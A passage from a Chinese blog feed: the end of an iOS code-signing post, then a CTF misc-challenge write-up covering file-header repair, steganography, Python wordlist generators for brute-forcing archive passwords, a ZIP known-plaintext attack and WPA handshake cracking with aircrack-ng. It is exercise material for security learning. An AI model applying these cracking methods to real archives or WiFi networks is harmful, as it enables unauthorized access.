<h3 id="Xcode项目分配"><a href="#Xcode项目分配" class="headerlink" title="Xcode项目分配"></a>Xcode项目分配</h3><p>每个Xcode项目与一个单独团队关联。如果你注册作为个人开发者,你被看做一个单人团队。团队账户用于存储应用程序需要的证书,标识符,和描述文件。所有的应用程序在设备上运行和使用某些应用程序服务都需要代码签名。Xcode会在需要的时候为你创建这些资产，但是你现在设置团队可以以后的避免警告对话框。</p>
<p>所有的iOS、watchOS之类的应用程序在设备上启动都需要代码签名，在进行Xcode项目分配的时候，Xcode将会使用你的信息去创建一个团队描述文件。例如Xcode会自动创建你的开发证书和注册一个链接设备或者你的Mac。Xcode使用这些信息来创建一个最终安装在设备上描述文件。如果设备在描述文件中，Xcode在这个设备上运行app。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-05%20%E4%B8%8A%E5%8D%881.18.36.png" alt="屏幕快照 2017-11-05 上午1.18.36.png" title="" class="">
                <p>屏幕快照 2017-11-05 上午1.18.36.png</p>
            </figure>
<p>如果代码签名和描述文件都有了，那么在真机运行的时候很快就好了，不然为了解决代码签名的问题可能会报一堆的警告</p>
<p>还有一个小点需要注意一下的就是还要对文件夹分配权限，有时候从别人U盘中读取的文件由于权限设置的不同会导致有些文件没有可执行权限。</p>
<p>所以当我们从github上下载代码之后，还需要对团队和bundle ID进行更改，创建了新的描述文件之后我们才能在自己的电脑上去运行这些程序。讲到这里，基本上一些普遍的问题也都包括了，之后遇到别的问题会继续补充。</p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><ol>
<li><a href="http://www.jianshu.com/p/0c5e856a2c88" target="_blank" rel="external">Doris_Lee的博客</a></li>
<li><a href="http://www.jianshu.com/p/0c5e856a2c88" target="_blank" rel="external">前端学习之iOS开发</a></li>
<li><a href="http://www.jianshu.com/p/21ebca8cadf6" target="_blank" rel="external">huangman的博客</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 第三方库管理 证书和描述文件 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-MISC(二)]]></title>
      <url>/2017/11/01/CTF-MISC-%E4%BA%8C/</url>
      <content type="html"><![CDATA[<p>安全领域博大精深，今天我们来继续领略其中的奥妙吧～</p>
<a id="more"></a>
<h2 id="0X00-女神"><a href="#0X00-女神" class="headerlink" title="0X00-女神"></a>0X00-女神</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-01%20%E4%B8%8A%E5%8D%8810.11.47.png" alt="屏幕快照 2017-11-01 上午10.11.47.png" title="" class="">
                <p>屏幕快照 2017-11-01 上午10.11.47.png</p>
            </figure>
<p>压缩包中是一个txt文件，其中是base64编码过的文件，解码之后发现是png文件，丢去识图一下就找出来了，如果用python来进行操作的话其实更快，下面就是一句话搞定:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>open(<span class="string">'nvshen.png'</span>, <span class="string">'wb'</span>).write((open(<span class="string">'nvshen.txt'</span>, <span class="string">'rb'</span>).read().decode(<span class="string">'base64'</span>))</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-01%20%E4%B8%8A%E5%8D%8810.05.09.png" alt="屏幕快照 2017-11-01 上午10.05.09.png" title="" class="">
                <p>屏幕快照 2017-11-01 上午10.05.09.png</p>
            </figure>
<p>接下来google识图or百度识图都OK，查出来居然还是个满族皇室，emmm，吾不言。</p>
<p>其实在这种地方推荐使用python的内置函数，这样不仅方便还不容易出错，在网上bae64解码很多时候都会出问题，保存图片的时候也不好使用二进制形式保存，造成png图片无法显示，给我们造成不必要的时间浪费。这个时候推荐使用python2，python3上面的编码方面有些麻烦</p>
<h2 id="0X01-有趣的文件"><a href="#0X01-有趣的文件" class="headerlink" title="0X01-有趣的文件"></a>0X01-有趣的文件</h2><p>打开之后发现是如下图所示的十六进制文件，前面的地址显然是不想要的，我们要把后面的字符串连在一起：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-01%20%E4%B8%8B%E5%8D%881.28.18.png" alt="屏幕快照 2017-11-01 下午1.28.18.png" title="" class="">
                <p>屏幕快照 2017-11-01 下午1.28.18.png</p>
            </figure>
<p>文件头afbc 1c27很明显没见过，联想以前gif图片总是缺少gif头，这次的文件很大可能就是缺少了部分文件头。经过一番搜索之后发现这个应该是缺少了7z压缩包的文件头，而且需要将十六进制的前后反序一下，因为7z的文件头是<code>377a bcaf 271c</code>,知道了之后我们就可以开始写程序了，需要注意的一点是保存文件需要以二进制文件的形式保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">revStr</span><span class="params">(s)</span>:</span></div><div class="line">	news=<span class="string">""</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">4</span>):</div><div class="line">		news+=s[i+<span class="number">2</span>:i+<span class="number">4</span>]</div><div class="line">		news+=s[i:i+<span class="number">2</span>]</div><div class="line">	<span class="keyword">return</span> news</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">	f=open(<span class="string">'funfile'</span>)</div><div class="line">	s=<span class="string">"377a"</span> <span class="comment">#7z的意思</span></div><div class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f:</div><div class="line">		s+=revStr(line.strip()[<span class="number">8</span>:].replace(<span class="string">' '</span>,<span class="string">''</span>))</div><div class="line">	fsave=open(<span class="string">'funsave.7z'</span>,<span class="string">'wb'</span>) <span class="comment">#必须有个b,表示以二进制保存</span></div><div class="line">	fsave.write(s.decode(<span class="string">'hex'</span>))</div><div class="line">	fsave.close()</div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	foo()</div><div class="line">	<span class="keyword">print</span> <span class="string">'ok'</span></div></pre></td></tr></table></figure>
<p>运行后，就会生成一个7z文件，解压出来是一张阿狸的图片，用winhex等工具打开，flag就在开头，然后将其base64解码即可得到本题的flag。</p>
<h2 id="0X02-保险箱"><a href="#0X02-保险箱" class="headerlink" title="0X02-保险箱"></a>0X02-保险箱</h2><p>下载下来一张图片，这个就是我的老本行了，先从简单的连招打过去，然后就爆了一个压缩包出来，压缩包被加密了，并不能打开，使用<code>rarcrack</code>跑了半天也没个结果，速度慢得要死，后来去网上查了一下，使用了名为ARPR的压缩包爆破工具，如果单纯暴力破解的话，显然从效率上也是不可取的，所以我们用python生成了一个四位数字典去爆破(因为题目的名字叫保险箱，所以先猜测是四位纯数字密码)，这里丢个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">max</span><span class="params">(a)</span>:</span></div><div class="line">    ji=<span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(a&gt;<span class="number">0</span>):</div><div class="line">        ji=ji*<span class="number">10</span></div><div class="line">        a=a<span class="number">-1</span></div><div class="line">    <span class="keyword">return</span> ji</div><div class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"two argument"</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    f=open(<span class="string">"m.txt"</span>,<span class="string">"w"</span>)</div><div class="line">    a=int(sys.argv[<span class="number">1</span>])</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,max(a)):</div><div class="line">        char=str(i).zfill(a)</div><div class="line">        f.write(char+<span class="string">"\r"</span>)</div><div class="line">    f.close()</div></pre></td></tr></table></figure>
<p>然后将这个选中为字典，在ARPR中进行爆破，基本不到一分钟即可以爆破出来，可以节省我们很多的效率。</p>
<h2 id="0X03-64格"><a href="#0X03-64格" class="headerlink" title="0X03-64格"></a>0X03-64格</h2><p>一个rar包，在Mac可以直接命令行解压，7z格式的也是，这里为使用Mac的同学稍微普及一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#rar解压</div><div class="line">unrar x xx.rar</div><div class="line">#7z解压</div><div class="line">7z e xx.7z</div></pre></td></tr></table></figure>
<p>解压缩之后是一个GIF图片，点击表示打不开，这个点小事直接丢进Hex Friend中看一下，补齐文件头之后看到19帧的图片，小黄人分别站在8x8的格子不同位置上，将它们的位置统计出来应该是：</p>
<blockquote>
<p>16 53 17 06 30 54 05 34 24 53 61 36 25 22 25 31 25 55 52</p>
</blockquote>
<p>这玩意看起来也不能转换成ASCII码，那么搜索一下64相关的，然后发现了一个64索引表：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-01%20%E4%B8%8B%E5%8D%887.58.29.png" alt="屏幕快照 2017-11-01 下午7.58.29.png" title="" class="">
                <p>屏幕快照 2017-11-01 下午7.58.29.png</p>
            </figure>
<p>对应一一解码之后发现是一个base64字符串，丢到python内置函数中居然没有接出来，后来弄了个在线的接出来才提交flag。这个就涉及到占位符的问题，python的内置函数如果缺少了必须的占位符就会报错，所以只要加上即可。</p>
<h2 id="0X04-这就是一个坑"><a href="#0X04-这就是一个坑" class="headerlink" title="0X04-这就是一个坑"></a>0X04-这就是一个坑</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-01%20%E4%B8%8B%E5%8D%8811.25.48.png" alt="屏幕快照 2017-11-01 下午11.25.48.png" title="" class="">
                <p>屏幕快照 2017-11-01 下午11.25.48.png</p>
            </figure>
<p>打开了这个压缩包之后有一个加密压缩包和一个tips.txt，说的就是题目中的提示内容</p>
<p>题目中说密码有十位，包含了大小写字母还有特殊符号，然而刚刚爆完上一个的我决定把它也爆掉（显然这是不可能的）</p>
<p>看到我的上面显示的时间需要一个世纪我就果断放弃了，还是从别的地方看看吧，从我的快压中打开加密压缩包之后发现</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-01%20%E4%B8%8B%E5%8D%8811.29.18.png" alt="屏幕快照 2017-11-01 下午11.29.18.png" title="" class="">
                <p>屏幕快照 2017-11-01 下午11.29.18.png</p>
            </figure>
<p>感觉这里应该就是突破点所在了，可能这两个txt文件是同样的txt文件，所以可以利用它做一次明文攻击（明文攻击使用条件是我们有一个加密压缩包中的一个文件），所以我们对tips.txt压缩一次：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-01%20%E4%B8%8B%E5%8D%8811.31.42.png" alt="屏幕快照 2017-11-01 下午11.31.42.png" title="" class="">
                <p>屏幕快照 2017-11-01 下午11.31.42.png</p>
            </figure>
<p>丢到这个里面跑个十分钟左右应该就OK了，应该考察的是观察能力和工具的利用吧。</p>
<h2 id="0X05-妹子的陌陌"><a href="#0X05-妹子的陌陌" class="headerlink" title="0X05-妹子的陌陌"></a>0X05-妹子的陌陌</h2><p>下载下来一张图片之后使用binwalk一扫果然内有乾坤，然后使用<code>foremost</code>分离之后有一个压缩包，然而需要密码，回头找密码应该就在图片找，一开始想的是这是一个jpg文件，那么很可能有jhide之类的隐藏算法，就用<code>stegdetect</code>测试了一下，结果通过修改敏感度居然检测到了jhide，于是我非常兴奋的开始寻找密码（以下省略一万字…）</p>
<p>最好搞了半天也搞不出来，肯定是遗忘了什么东西，回到图，发现上面有”喜欢我么.”这样的字符，题目从来不会出没有必要的东西，那么显然这个应该是密码，尝试了一波还是不对，接着又试了一波压缩包的密码，压缩包就解压了…难道是一开始就想错了方向么？？？</p>
<p>然后就出来下面所示的文本文件，我们打开看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">嘟嘟嘟嘟</div><div class="line">士兵：报告首长！已截获纳粹的加密电报！</div><div class="line">首长：拿来看看</div><div class="line"></div><div class="line">电报内容：</div><div class="line">..../-/-/.--./---.../-..-./-..-././-./-.-./---/-.././.-.-.-/-.-./..../.-/..../..-/---/.-.-.-/-.-./---/--/-..-.</div><div class="line"></div><div class="line">首长：我操你在逗我吗？你确定是他们纳粹发的吗？</div><div class="line">士兵：难道我弄错了？哦。。。等等是这一条</div><div class="line"></div><div class="line">内容：http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</div><div class="line">      AES Key：@<span class="comment">#@#¥%⋯⋯¥¥%%⋯⋯&amp;¥</span></div><div class="line"></div><div class="line">士兵：二维码真的扫不出来吗？？肯定可以扫出来</div></pre></td></tr></table></figure>
<p>既然都说了是AES算法，接下来就很简单了，直接解出来是一个图片的url，下载之后发现扫不出来，定睛一看，诶这个二维码似乎有点不对啊：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-04%20%E4%B8%8B%E5%8D%885.38.00.png" alt="屏幕快照 2017-11-04 下午5.38.00.png" title="" class="">
                <p>屏幕快照 2017-11-04 下午5.38.00.png</p>
            </figure></p>
<p>可以直接通过Mac上的预览中的工具反色，为了锻炼自己的脚本能力，我决定自己写一个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">imagePath = sys.argv[<span class="number">1</span>]</div><div class="line">im = Image.open(imagePath)</div><div class="line">im1 = Image.new(<span class="string">'RGB'</span>, (im.size[<span class="number">0</span>], im.size[<span class="number">1</span>]), <span class="string">'#ffffff'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(im.size[<span class="number">0</span>]):</div><div class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(im.size[<span class="number">1</span>]):</div><div class="line">    <span class="keyword">if</span> im.getpixel((i, j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>):</div><div class="line">      im1.putpixel([i, j], (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      im1.putpixel([i, j], (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</div><div class="line">im1.show()</div></pre></td></tr></table></figure>
<h2 id="0X06-破解wifi密码"><a href="#0X06-破解wifi密码" class="headerlink" title="0X06-破解wifi密码"></a>0X06-破解wifi密码</h2><p>题目的提示想要蹭网的话就来破解wifi的密码吧，tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你：1391040，Goodluck!!下载下来是一个数据包，接下来就开始我们的破解环节了：</p>
<p>我们都知道wifi认证的过程重点就是在WPA的四次握手包，也就是eapol协议的包，所以就可以使用wireshark先过滤一波</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-04%20%E4%B8%8B%E5%8D%889.12.46.png" alt="屏幕快照 2017-11-04 下午9.12.46.png" title="" class="">
                <p>屏幕快照 2017-11-04 下午9.12.46.png</p>
            </figure>
<p>接下来就直接手写一个脚本生成上面所有情况的电话号码，使用aircrack-ng即可，这里丢一个python的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNumber</span><span class="params">(a)</span>:</span></div><div class="line">    s=<span class="number">1</span></div><div class="line">    <span class="keyword">while</span>(a&gt;<span class="number">0</span>):</div><div class="line">        s *= <span class="number">10</span></div><div class="line">        a = a<span class="number">-1</span></div><div class="line">    <span class="keyword">return</span> s</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</div><div class="line">    <span class="keyword">print</span> (<span class="string">"we need the number"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    f=open(<span class="string">"m.txt"</span>,<span class="string">'w'</span>)</div><div class="line">    a=int(sys.argv[<span class="number">1</span>])</div><div class="line">    print(a)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, getNumber(a)):</div><div class="line">        char=<span class="string">'1391040'</span> + str(i).zfill(a)</div><div class="line">        f.write(char+<span class="string">"\n"</span>)</div><div class="line">    f.close()</div></pre></td></tr></table></figure>
<p>三秒就爆出我们所需要的wifi密码，字典写的好，爆破爆的早：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-04%20%E4%B8%8B%E5%8D%889.19.58.png" alt="屏幕快照 2017-11-04 下午9.19.58.png" title="" class="">
                <p>屏幕快照 2017-11-04 下午9.19.58.png</p>
            </figure>
<p>然后就可以直接提交我们的key了，这题是不是特别简单。</p>
<h2 id="0X07-听首音乐吧"><a href="#0X07-听首音乐吧" class="headerlink" title="0X07-听首音乐吧"></a>0X07-听首音乐吧</h2><p>下载下来是wav格式的音乐，第一时间想到的就是MP3Stego去解决，但是重点是密码是多少呢，压缩包解压之后之后一个音乐，那么首先试试弱密码，不对。那么回头想想，会不会答案藏在音乐中呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">strings stego100.wav | grep &apos;KEY&apos;</div><div class="line">strings stego100.wav | grep &apos;flag&apos;</div></pre></td></tr></table></figure>
<p>但是依旧一无所获，没办法，听听音乐吧，结果在大概几十秒的时候听到了嘀嗒的声音，猜测可能是摩斯电码，即使凭借我超常的听力记录下来了摩斯code：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</div></pre></td></tr></table></figure>
<p>接下来就是对它解密了，解密成功之后得到字符串，立马就使用了MP3Stego去decode，这个密码还真长哈，结果发现还是不对，这不可能！再次回到开头，难道是md5？尝试后失败，于是我干脆就直接拿这个提交了，然后就成功了，看来做人有时候不要想太多，脑洞要懂得收放自如才是真理。</p>
<h2 id="0X08-图穷匕见"><a href="#0X08-图穷匕见" class="headerlink" title="0X08-图穷匕见"></a>0X08-图穷匕见</h2><p>下载图片之后首先使用HexFriend分析其十六进制下的情况，然后就发现了一些异常，中间有着大量的0，然后结尾都是一些字符串，然后我就顺便搜了一下jpg的结束标志FFD9：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-05%20%E4%B8%8B%E5%8D%887.18.20.png" alt="屏幕快照 2017-11-05 下午7.18.20.png" title="" class="">
                <p>屏幕快照 2017-11-05 下午7.18.20.png</p>
            </figure>
<p>这说明后面的都是附加部分，于是我们可以将后面的部分拷贝出来观察一下，发现它的十六进制转换成文本之后同样是十六进制，然后我们在进行一次十六进制转换之后可以发现这时候的文本变成了坐标：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-05%20%E4%B8%8B%E5%8D%887.23.15.png" alt="屏幕快照 2017-11-05 下午7.23.15.png" title="" class="">
                <p>屏幕快照 2017-11-05 下午7.23.15.png</p>
            </figure>
<p>将其中的信息导出我们可以写一个python的脚本去还原，基本可以猜测这是一个二维码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval <span class="keyword">as</span> make_tuple</div><div class="line"></div><div class="line">f = open(<span class="string">'paintpaintpaint'</span>, <span class="string">'r'</span>)</div><div class="line">points = [make_tuple(line) <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</div><div class="line">f.close()</div><div class="line">im = Image.new(<span class="string">'RGB'</span>, (<span class="number">272</span>, <span class="number">272</span>), <span class="string">'#ffffff'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> points:</div><div class="line">  im.putpixel([i[<span class="number">0</span>], i[<span class="number">1</span>]], (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line">im.show()</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-05%20%E4%B8%8B%E5%8D%887.41.58.png" alt="屏幕快照 2017-11-05 下午7.41.58.png" title="" class="">
                <p>屏幕快照 2017-11-05 下午7.41.58.png</p>
            </figure>这样就是自己动手丰衣足食了，不然可以练脚本小子的称号都没有的<br><br><br><br>## 0X09-convert<br><br>打开网址后看到全屏的二进制01串，首先要转换成十六进制，然后我们使用HexFriend打开之后看到的是个压缩包文件：<br><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-05%20%E4%B8%8B%E5%8D%888.44.13.png" alt="屏幕快照 2017-11-05 下午8.44.13.png" title="" class="">
                <p>屏幕快照 2017-11-05 下午8.44.13.png</p>
            </figure>
<p>然后另存为之后解压看到一张图片。这个时候就应该由浅入深分析了，jpg格式的图片中不可能是LSB隐藏算法，所以就用binwalk扫一下有没有压缩包，Mac上可以打开，说明CRC也没有问题，然后右键看图片的详细信息，发现有base64编码的字符串（windows下），解码之后成功得到flag，下面丢出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">f=open(<span class="string">'convert.txt'</span>)</div><div class="line">a=f.read()</div><div class="line">i=<span class="number">0</span></div><div class="line">str=<span class="string">''</span></div><div class="line"><span class="keyword">while</span> i &lt;= len(a)<span class="number">-4</span>:</div><div class="line">    h = a[i:i+<span class="number">4</span>]</div><div class="line">    i += <span class="number">4</span></div><div class="line">    h = hex(int(h, <span class="number">2</span>))</div><div class="line">    str += h[<span class="number">-1</span>:]</div><div class="line">print(str)</div></pre></td></tr></table></figure>
<p>整个解决问题的核心其实就在于脚本的编写了。很多网上的十六进制转换工具是不支持这样转换的。</p>
<h2 id="0X0A-细心的大象"><a href="#0X0A-细心的大象" class="headerlink" title="0X0A-细心的大象"></a>0X0A-细心的大象</h2><p>通过网址下载图片，通过binwalk发现了其中的隐藏文件，直接提取出来即可，其中就是一个大象的图片和一个加密的的压缩包，进行各种排查之后发现没有什么问题，所以考虑一下是不是系统的问题，然后丢到了虚拟机中发现：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-05%20%E4%B8%8B%E5%8D%8811.44.48.png" alt="屏幕快照 2017-11-05 下午11.44.48.png" title="" class="">
                <p>屏幕快照 2017-11-05 下午11.44.48.png</p>
            </figure>
<p>解码字符串得到密码，通过密码解开rar压缩包，发现和之前一题的图片蕾丝，windows上可以显示，Mac/Linux下不行，所以还是修改一下高度即可。</p>
<h2 id="0X0B-ROT13变身了"><a href="#0X0B-ROT13变身了" class="headerlink" title="0X0B-ROT13变身了"></a>0X0B-ROT13变身了</h2><p>首先先按照ROT13将所给的字符串左移13个ASCII码，看看会有什么样的提示，在这里我们写个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">buf=[<span class="number">83</span>,<span class="number">89</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">45</span>,<span class="number">86</span>,<span class="number">96</span>,<span class="number">45</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">136</span>,<span class="number">132</span>,<span class="number">132</span>,<span class="number">132</span>,<span class="number">108</span>,<span class="number">128</span>,<span class="number">117</span>,<span class="number">118</span>,<span class="number">134</span>,<span class="number">110</span>,<span class="number">123</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">127</span>,<span class="number">108</span>,<span class="number">112</span>,<span class="number">124</span>,<span class="number">122</span>,<span class="number">108</span>,<span class="number">118</span>,<span class="number">128</span>,<span class="number">108</span>,<span class="number">131</span>,<span class="number">114</span>,<span class="number">127</span>,<span class="number">134</span>,<span class="number">108</span>,<span class="number">116</span>,<span class="number">124</span>,<span class="number">124</span>,<span class="number">113</span>,<span class="number">108</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">138</span>,<span class="number">23</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">66</span>,<span class="number">71</span>,<span class="number">64</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">65</span>,<span class="number">112</span>,<span class="number">64</span>,<span class="number">66</span>,<span class="number">63</span>,<span class="number">69</span>,<span class="number">61</span>,<span class="number">70</span>,<span class="number">114</span>,<span class="number">62</span>,<span class="number">66</span>,<span class="number">61</span>,<span class="number">62</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">70</span>,<span class="number">63</span>,<span class="number">61</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">112</span>,<span class="number">64</span>,<span class="number">68</span>,<span class="number">62</span>,<span class="number">70</span>,<span class="number">61</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">112</span>]</div><div class="line">buf=[chr(i<span class="number">-13</span>) <span class="keyword">for</span> i <span class="keyword">in</span> buf]</div><div class="line"><span class="keyword">print</span> <span class="string">""</span>.join(buf)</div></pre></td></tr></table></figure>
<p>于是乎我们得到了一个不完整的flag和一个md5的值，很容易我们就可以的值这应该是爆破，对flagmd5加密之后和这个值做一次对比，因为可见字符的个数是95，而这里有4位未知，所以我们就用python的内置函数写个脚本跑一下：</p>
